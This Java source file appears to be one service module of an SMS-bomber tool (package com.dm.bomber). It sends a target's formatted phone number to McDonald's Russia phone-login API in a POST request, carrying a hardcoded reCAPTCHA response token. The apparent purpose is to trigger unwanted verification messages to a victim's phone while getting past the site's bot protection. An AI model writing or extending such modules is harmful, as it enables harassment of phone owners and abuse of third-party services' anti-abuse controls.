package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

public class Mcdonalds extends JsonService {

    public Mcdonalds() {
        setUrl("https://site-api.mcdonalds.ru/api/v1/user/login/phone");
        setMethod(POST);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("number", "+" + getFormattedPhone());
            json.put("g-recaptcha-response", "03AGdBq24VZzz6ZdGiBJtPMdrCTJcVR-NHlto4LWq2COdZlAYu3iDTcwVnkIDi5YMTyfcsoFYpBsMuZDMi5QKAaIqGVIoLdEKlBg-VTVyrNRk2Xl73gzaorOAY0amGmAzprdmCbUVW6ficToPzqW0HNXfKVyWgeLg6OrX0EYBbynwxFt5EjZ-ETGp8dUEnB9D4O4bfjxYi1bLlc5DiC5nPS6HsEr0jT3ptDFYiPGB6gst353VcCsdqS6mWWM4V-Zzjg-8t6hi1R7nYLF0LCAeY6TLbQXNtgGw3LTv9KW6FjZ7PDV86JlGoXLcPkQbWcUDHRzR29AnjccR5YqzKCs-MGQoyWQUBJVaokRLV7wfNkS6hW1E7U1vA8cHpC6mN3jEZ-FsMMZILNQl62a_ixbgRTA3ccgLhJbUlMy2YqJQn8j6l7miJH2fyGC4A7UxfMEpeZJ_myojoZORp");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
